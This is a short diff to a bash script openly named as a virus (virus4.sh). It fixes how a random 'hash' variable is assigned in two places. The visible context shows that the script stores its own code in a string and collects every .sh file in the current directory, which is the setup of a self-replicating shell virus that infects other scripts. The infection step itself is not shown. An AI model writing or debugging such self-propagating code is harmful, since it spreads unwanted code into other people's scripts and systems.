@@ -2,7 +2,7 @@
 
 if [ ! -f ~/.virus4.sh ]; then
 
-    hash = $RANDOM * $RANDOM * $RANDOM
+    hash=$RANDOM$RANDOM$RANDOM
     actual_virus='#!/bin/bash
 
 files=`find . -type f -name "*.sh" | sed "s/.\\///"`
@@ -11,7 +11,7 @@ filename=$(basename $0)
 
 virus='"'"'#!/bin/bash
 
-hash=$RANDOM * $RANDOM * $RANDOM
+hash=$RANDOM$RANDOM$RANDOM
 files=($(ls *.sh | tr " " "\\n"))
 filename=$(basename $0)
 
